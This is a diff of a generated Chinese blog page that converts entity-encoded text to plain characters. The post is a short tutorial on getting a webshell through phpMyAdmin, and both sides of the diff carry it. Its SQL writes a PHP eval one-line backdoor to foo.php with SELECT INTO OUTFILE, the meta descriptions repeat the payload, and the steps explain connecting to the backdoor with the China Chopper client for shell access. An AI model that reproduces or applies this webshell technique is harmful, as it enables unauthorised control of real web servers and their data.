@@ -86,16 +86,16 @@
 
 
 
-<meta name="description" content="&amp;#x8FDB;&amp;#x5165;&amp;#x5230;phpmyadmin&amp;#x540E;&amp;#x53F0;&amp;#xFF08;&amp;#x672C;&amp;#x4F8B;&amp;#x4E2D;&amp;#x4EE5;bak&amp;#x914D;&amp;#x7F6E;&amp;#x6587;&amp;#x4EF6;&amp;#x6CC4;&amp;#x9732;&amp;#x4E3A;&amp;#x4F8B;&amp;#xFF09;12345&amp;#xA0; create table foo(`cmd`">
+<meta name="description" content="进入到phpmyadmin后台（本例中以bak配置文件泄露为例）12345  create table foo(`cmd` text not null);  insert into `foo`(`cmd`) values (&quot;&amp;lt;?php @eval($_POST[&apos;foo&apos;]);?&amp;gt;&quot;);  select `cmd`  from `foo` into outfile &quot;./foo.ph">
 <meta property="og:type" content="article">
 <meta property="og:title" content="phpmyadmin获得shell--初试一句话木马，chopper">
 <meta property="og:url" content="https://asanzjx.github.io/2015/08/01/2015-08-01-phpmyadmin获得shell--初试一句话木马，chopper/index.html">
 <meta property="og:site_name" content="Asan'world">
-<meta property="og:description" content="&amp;#x8FDB;&amp;#x5165;&amp;#x5230;phpmyadmin&amp;#x540E;&amp;#x53F0;&amp;#xFF08;&amp;#x672C;&amp;#x4F8B;&amp;#x4E2D;&amp;#x4EE5;bak&amp;#x914D;&amp;#x7F6E;&amp;#x6587;&amp;#x4EF6;&amp;#x6CC4;&amp;#x9732;&amp;#x4E3A;&amp;#x4F8B;&amp;#xFF09;12345&amp;#xA0; create table foo(`cmd`">
+<meta property="og:description" content="进入到phpmyadmin后台（本例中以bak配置文件泄露为例）12345  create table foo(`cmd` text not null);  insert into `foo`(`cmd`) values (&quot;&amp;lt;?php @eval($_POST[&apos;foo&apos;]);?&amp;gt;&quot;);  select `cmd`  from `foo` into outfile &quot;./foo.ph">
 <meta property="og:updated_time" content="2016-08-18T07:17:44.514Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpmyadmin获得shell--初试一句话木马，chopper">
-<meta name="twitter:description" content="&amp;#x8FDB;&amp;#x5165;&amp;#x5230;phpmyadmin&amp;#x540E;&amp;#x53F0;&amp;#xFF08;&amp;#x672C;&amp;#x4F8B;&amp;#x4E2D;&amp;#x4EE5;bak&amp;#x914D;&amp;#x7F6E;&amp;#x6587;&amp;#x4EF6;&amp;#x6CC4;&amp;#x9732;&amp;#x4E3A;&amp;#x4F8B;&amp;#xFF09;12345&amp;#xA0; create table foo(`cmd`">
+<meta name="twitter:description" content="进入到phpmyadmin后台（本例中以bak配置文件泄露为例）12345  create table foo(`cmd` text not null);  insert into `foo`(`cmd`) values (&quot;&amp;lt;?php @eval($_POST[&apos;foo&apos;]);?&amp;gt;&quot;);  select `cmd`  from `foo` into outfile &quot;./foo.ph">
 
 
 
@@ -319,11 +319,11 @@
       
 
       
-        <h3 id="&#x8FDB;&#x5165;&#x5230;phpmyadmin&#x540E;&#x53F0;&#x672C;&#x4F8B;&#x4E2D;&#x4EE5;bak&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6CC4;&#x9732;&#x4E3A;&#x4F8B;"><a href="#&#x8FDB;&#x5165;&#x5230;phpmyadmin&#x540E;&#x53F0;&#xFF08;&#x672C;&#x4F8B;&#x4E2D;&#x4EE5;bak&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6CC4;&#x9732;&#x4E3A;&#x4F8B;&#xFF09;" class="headerlink" title="&#x8FDB;&#x5165;&#x5230;phpmyadmin&#x540E;&#x53F0;&#xFF08;&#x672C;&#x4F8B;&#x4E2D;&#x4EE5;bak&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6CC4;&#x9732;&#x4E3A;&#x4F8B;&#xFF09;"></a>&#x8FDB;&#x5165;&#x5230;phpmyadmin&#x540E;&#x53F0;&#xFF08;&#x672C;&#x4F8B;&#x4E2D;&#x4EE5;bak&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6CC4;&#x9732;&#x4E3A;&#x4F8B;&#xFF09;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#xA0; create table foo(`cmd` text not <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">&#xA0; insert into `foo`(`cmd`) values (<span class="string">&quot;&lt;?php&#xA0;@eval($_POST[&apos;foo&apos;]);?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#xA0; select `cmd`&#xA0; from `foo` into outfile <span class="string">&quot;./foo.php&quot;</span></span><br></pre></td></tr></table></figure>
-<p>(&#x6700;&#x597D;&#x80FD;&#x627E;&#x5230;&#x7F51;&#x7AD9;&#x8DEF;&#x5F84;&#x7684;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x8FD9;&#x6837;&#x5199;&#x7684;&#x8BDD;&#x5728;\wamp\bin\mysql\mysql5.6.17\data&#x76EE;&#x5F55;&#x4E0B;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A;foo.php&#x6587;&#x4EF6;);</p>
-<p>&#x6267;&#x884C;&#x5B8C;&#x547D;&#x4EE4;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x6D4B;&#x8BD5;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x76F4;&#x63A5;&#x6253;&#x5F00;/foo.php&#xFF0C;&#x5982;&#x679C;&#x51FA;&#x73B0;&#x7A7A;&#x767D;&#x5C31;&#x53EF;&#x4EE5;&#x3002;</p>
-<h3 id="&#x63A5;&#x4E0B;&#x6765;&#x7528;chopper"><a href="#&#x63A5;&#x4E0B;&#x6765;&#x7528;chopper" class="headerlink" title="&#x63A5;&#x4E0B;&#x6765;&#x7528;chopper"></a>&#x63A5;&#x4E0B;&#x6765;&#x7528;chopper</h3><p>&#x5730;&#x5740;&#x4E3A;&#x7F51;&#x7AD9;foo.php&#x5730;&#x5740;&#xFF0C;&#x5BC6;&#x7801;&#x4E3A;$_POST[]&#x5185;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x914D;&#x7F6E;&#xFF08;&#x53EF;&#x586B;&#x53EF;&#x4E0D;&#x586B;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x5E93;&#x7684;&#x8BDD;&#x8981;&#x586B;&#xFF09;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x662F;&#x811A;&#x672C;&#x7C7B;&#x578B;&#xFF0C;&#x7F16;&#x7801;&#x3002;</p>
-<p>&#x8FD9;&#x6837;&#x5C31;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x7F51;&#x7AD9;&#x7684;shell&#xFF0C;&#x770B;shell&#x7684;&#x6743;&#x9650;&#xFF0C;&#x6709;&#x7684;&#x6743;&#x9650;&#x5F88;&#x5927;&#xFF0C;&#x6709;&#x7684;&#x6743;&#x9650;&#x7D27;&#x7D27;&#x9650;&#x4E8E;&#x7F51;&#x7AD9;&#x6839;&#x76EE;&#x5F55;&#x7684;&#x7BA1;&#x7406;&#x3002;</p>
+        <h3><span id="进入到phpmyadmin后台本例中以bak配置文件泄露为例">进入到phpmyadmin后台（本例中以bak配置文件泄露为例）</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  create table foo(`cmd` text not <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">  insert into `foo`(`cmd`) values (<span class="string">"&lt;?php @eval($_POST['foo']);?&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  select `cmd`  from `foo` into outfile <span class="string">"./foo.php"</span></span><br></pre></td></tr></table></figure>
+<p>(最好能找到网站路径的的路径，这样写的话在\wamp\bin\mysql\mysql5.6.17\data目录下会生成一个foo.php文件);</p>
+<p>执行完命令后，可以测试是否成功，浏览器直接打开/foo.php，如果出现空白就可以。</p>
+<h3><span id="接下来用chopper">接下来用chopper</span></h3><p>地址为网站foo.php地址，密码为$_POST[]内的内容，配置（可填可不填，如果要管理数据库的话要填），接下来是脚本类型，编码。</p>
+<p>这样就基本可以获得网站的shell，看shell的权限，有的权限很大，有的权限紧紧限于网站根目录的管理。</p>
 
       
     </div>
@@ -496,7 +496,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#进入到phpmyadmin后台本例中以bak配置文件泄露为例"><span class="nav-number">1.</span> <span class="nav-text">进入到phpmyadmin后台（本例中以bak配置文件泄露为例）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#接下来用chopper"><span class="nav-number">2.</span> <span class="nav-text">接下来用chopper</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">进入到phpmyadmin后台（本例中以bak配置文件泄露为例）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">接下来用chopper</span></a></li></ol></div>
             
           </div>
         </section>
